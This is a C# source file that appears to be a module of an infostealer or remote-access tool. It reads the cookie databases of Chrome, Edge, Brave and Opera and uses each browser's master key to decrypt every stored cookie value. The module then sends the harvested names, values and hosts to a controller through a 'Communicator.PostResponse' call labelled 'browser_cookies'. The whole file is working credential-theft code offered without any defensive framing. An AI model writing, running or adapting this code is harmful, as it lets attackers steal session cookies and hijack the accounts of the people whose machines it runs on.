using System;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using True.Core;
using True.Helper;

namespace True.Features
{
    internal class BrowserCookiesExtractor
    {
        private static readonly string LocalAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        private static readonly (string cookiePath, string localStatePath, string browser)[] Targets =
        {
            (@"Google\Chrome\User Data\Default\Network\Cookies", @"Google\Chrome\User Data\Local State", "Chrome"),
            (@"Microsoft\Edge\User Data\Default\Network\Cookies", @"Microsoft\Edge\User Data\Local State", "Edge"),
            (@"BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies", @"BraveSoftware\Brave-Browser\User Data\Local State", "Brave"),
            (@"Opera Software\Opera Stable\Network\Cookies", @"Opera Software\Opera Stable\Local State", "Opera")
        };

        public static void Extract()
        {
            StringBuilder result = new();

            foreach (var (dbRelative, stateRelative, browser) in Targets)
            {
                string cookieDbPath = Path.Combine(LocalAppData, dbRelative);
                string localStatePath = Path.Combine(LocalAppData, stateRelative);

                if (!File.Exists(cookieDbPath) || !File.Exists(localStatePath))
                {
                    Logger.Warn($"[BrowserCookies] {browser}: Cookie DB or Local State not found.");
                    continue;
                }

                try
                {
                    byte[] masterKey = ChromeDecryptor.GetMasterKey(localStatePath);

                    string tempPath = Path.GetTempFileName();
                    File.Copy(cookieDbPath, tempPath, true);

                    using var conn = new SQLiteConnection($"Data Source={tempPath};Version=3;");
                    conn.Open();

                    using var cmd = new SQLiteCommand("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure FROM cookies", conn);
                    using var reader = cmd.ExecuteReader();

                    int count = 0;
                    while (reader.Read())
                    {
                        string host = reader.GetString(0);
                        string name = reader.GetString(1);
                        byte[] encrypted = (byte[])reader["encrypted_value"];
                        string decrypted = ChromeDecryptor.Decrypt(encrypted, masterKey);

                        string path = reader.GetString(3);
                        long expires = reader.GetInt64(4);
                        bool secure = reader.GetBoolean(5);

                        result.AppendLine($"[{browser}] {name} = {decrypted}");
                        result.AppendLine($"Host: {host}, Path: {path}, Secure: {secure}, Expires: {ChromiumTimeToDateTime(expires)}");
                        result.AppendLine();

                        count++;
                    }

                    if (count == 0)
                        result.AppendLine($"[{browser}] No cookies found.");

                    conn.Close();
                    File.Delete(tempPath);
                }
                catch (Exception ex)
                {
                    Logger.Error($"[BrowserCookies] {browser} failed: {ex.Message}");
                }
            }

            if (result.Length == 0)
                result.Append("(no cookies)");

            Communicator.PostResponse("browser_cookies", result.ToString().Trim());
        }

        private static DateTime ChromiumTimeToDateTime(long chromeTime)
        {
            return chromeTime == 0 ? DateTime.MinValue : new DateTime(1601, 1, 1).AddTicks(chromeTime * 10);
        }
    }
}
